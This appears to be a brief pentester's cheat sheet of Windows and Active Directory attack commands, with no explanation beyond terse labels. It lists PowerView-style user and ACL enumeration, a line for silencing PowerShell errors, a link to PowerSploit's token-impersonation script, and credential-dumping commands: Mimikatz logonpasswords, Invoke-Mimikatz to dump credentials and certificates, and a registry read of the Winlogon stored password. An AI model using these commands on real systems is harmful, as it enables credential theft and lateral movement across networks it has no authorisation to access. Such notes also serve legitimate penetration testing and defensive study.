rdate -n \<dc-ip\> ***Sync localtime with DC***
  
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share ***RDP***

$ErrorActionPreference= 'silentlycontinue' ***Hide Error in PowerShell***

Get-UserProperty -Properties logoncount | Where logoncount -ne 0 ***Filtering Powershell objects***

Get-ObjectAcl -SamAccountName Control174User –ResolveGUIDs | Where-Object {$_.IdentityReference -like "RDP*"} ***Filtering Powershell objects***

Token impersonation is now a part of Powersploit https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1

Mimi: 

sekurlsa::logonpasswords

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword"

Invoke-Mimikatz -DumpCreds/-DumpCerts
